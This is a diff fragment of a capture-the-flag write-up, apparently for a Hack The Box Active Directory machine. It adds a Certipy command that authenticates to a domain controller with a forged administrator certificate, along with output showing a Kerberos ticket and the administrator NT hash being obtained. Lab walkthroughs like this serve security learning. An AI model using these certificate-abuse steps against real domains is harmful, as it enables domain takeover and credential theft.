@@ -627,5 +627,26 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 [*] Wrote certificate and private key to 'administrator_dc01.pfx'
 ```
 
+```python
+certipy-ad auth -pfx administrator_dc01.pfx -dc-ip 10.129.232.128                     
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@sequel.htb'
+[*]     SAN DNS Host Name: 'dc01.sequel.htb'
+[*]     SAN URL SID: 'S-1-5-21-548670397-972687484-3496335370-500'
+[*]     Security Extension SID: 'S-1-5-21-548670397-972687484-3496335370-500'
+[*] Found multiple identities in certificate
+[*] Please select an identity:
+    [0] UPN: 'administrator@sequel.htb' (administrator@sequel.htb)
+    [1] DNS Host Name: 'dc01.sequel.htb' (dc01$@sequel.htb)
+> 0
+[*] Using principal: 'administrator@sequel.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
+```
 
